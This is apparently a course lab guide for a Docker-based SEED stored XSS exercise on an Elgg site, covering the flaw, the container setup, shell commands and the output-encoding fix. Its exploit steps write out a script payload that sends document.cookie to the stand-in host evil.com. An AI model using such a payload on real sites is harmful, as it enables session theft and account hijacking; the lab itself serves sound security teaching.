# Lab 02 — Cross-Site Scripting (XSS) Attack Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/
Textbook: Chapter 11 — Cross-Site Scripting Attack (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#3-lab-02--cross-site-scripting-xss)
CWE Reference: [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access the application in host browsers via `http://localhost:10081` (or `http://www.seed-server.com:10081` if `127.0.0.1 www.seed-server.com` is in your host hosts file). Do not use internal container IP `10.9.0.5` directly in host browsers.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it elgg-10.9.0.5 sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

## Security Concept

### The Security Hole
The web application accepts user profile text (such as "About Me" bios) and stores it raw inside the MySQL database. When another user views the profile, the application echoes the unescaped text directly into the HTML response stream (`echo $row['profile_about']`).

### How it Causes a Problem
If an attacker inputs JavaScript code (`<script>...</script>`) into their profile bio, the browser receives raw script tags in the HTML response. The victim's browser cannot distinguish between application JavaScript and injected attacker JavaScript, executing the code inside the victim's authenticated session context. This enables stealing session cookies (`document.cookie`), hijacking accounts, or deploying self-propagating profile worms.

### Actionable Exploit Steps
1. Attacker logs into the lab site and edits the “About Me” field, inserting a payload such as `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`.
2. The payload is stored unchanged in the MySQL `profile_about` column.
3. When any victim visits the attacker’s profile page, the stored payload is echoed into the page markup.
4. The victim’s browser executes the script, causing the malicious `fetch` request to send the victim’s session cookie to the attacker‑controlled server (`evil.com`).
5. The attacker can reuse the captured cookie to impersonate the victim or perform further actions.

```php
// Attacker saves payload into "About Me" profile field:
// <script>alert(document.cookie)</script>

// Unescaped PHP code renders raw HTML:
echo $row['profile_about'];
// Browser receives: <script>alert(document.cookie)</script>
// Browser executes the script in the context of any user viewing the profile
```

### Actionable Mitigation
The application must perform context-aware output encoding using `htmlspecialchars($text, ENT_QUOTES, 'UTF-8')` before inserting user-derived data into HTML documents. This converts dangerous markup characters (`<`, `>`, `"`, `'`) into harmless HTML entities (`&lt;`, `&gt;`, `&quot;`, `&#039;`), forcing the browser to display text rather than execute code.

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 127.0.0.1 (or localhost:10081)
  | Port mapping: host:10081 -> container:80
  |
  Docker Bridge Network: net-10.9.0.0-xss  (10.9.0.0/24)
    |
    +---- elgg-10.9.0.5       (Apache + PHP + Elgg social network app)
    |         |
    |         | MySQL connection to 10.9.0.6:3306
    |         |
    +---- mysql-10.9.0.6-xss  (MySQL 8.0 + elgg database with user profiles)
```

Attack flow:
```
Samy (attacker) logs in -> edits "About Me" -> saves XSS payload to database
Alice (victim) logs in  -> views Samy's profile -> browser loads stored script
Browser executes script -> reads Alice's session cookie or performs actions as Alice
```

---

## Layer 1 — Docker Commands (host terminal)

### Start the Lab

```bash
cd labs/02-xss
.\start.ps1       # Windows PowerShell
./start.sh        # Linux / WSL2 bash
```

### Verify Container Status

```bash
docker compose ps
docker inspect elgg-10.9.0.5
```

### Watch Logs from Host

```bash
docker compose logs -f elgg
docker compose logs -f mysql
```

---

## Layer 2 — Linux Commands (inside the container)

### Open Bash Shell Inside the Web Container

```bash
docker exec -it elgg-10.9.0.5 bash
```

### Establish Identity and Network Context

```bash
whoami
hostname
ip addr show
```

### Inspect Application Files

```bash
cd /var/www/html
ls -la
grep -n "profile_about\|echo\|print" index.php
```

### View Real-Time Requests

```bash
tail -f /var/log/apache2/access.log
```

### Exit Container

```bash
exit
```

---

## Layer 3 — Security Tasks

### Configure Hostname

Windows (PowerShell as Administrator):
```powershell
Add-Content "C:\Windows\System32\drivers\etc\hosts" "127.0.0.1   www.seed-server.com"
```

Linux / WSL2:
```bash
echo "127.0.0.1   www.seed-server.com" | sudo tee -a /etc/hosts
```

### Access the Application

```
http://localhost:10081
http://www.seed-server.com:10081   (with hosts file)
```

---

## Stop and Reset

```bash
docker compose down
docker compose down -v
```
